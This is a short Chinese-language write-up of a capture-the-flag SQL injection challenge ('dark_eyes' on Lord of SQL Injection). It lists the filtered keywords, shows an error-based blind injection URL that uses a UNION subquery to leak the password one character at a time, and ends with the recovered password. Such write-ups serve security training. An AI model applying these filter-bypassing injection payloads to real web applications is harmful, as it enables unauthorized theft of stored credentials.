Q22_dark_eyes
===

這題過濾掉的東西可多了col、if、case、when、sleep、benchmark。
似乎可以用來判斷 True、False 的方法都被濾掉了...
頁面上的 Debug 頁面也變置換成空白頁面。

但還是可以透過 SELECT union 的方式來造成 ERROR。
```
https://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw='|| (select substr(pw,1,1)="5" union select false)%23
```

當 subser(pw,1,1)= "" 成立的時候便會執行 union select false 便造成意外:Subquery returns more than 1 row。
```SQL
(select substr(pw,1,1)="5" union select false)
```

腳本:
![](https://i.imgur.com/LlAzDZg.png)

結果:
![](https://i.imgur.com/Xye8Iqg.png)

Payload:
```
https://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw=5a2f5d3c
```

## 授權聲明
[![copyright © 2019 By MksYi](https://img.shields.io/badge/copyright%20©-%202019%20By%20MksYi-blue.svg)](https://mks.tw/)
[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)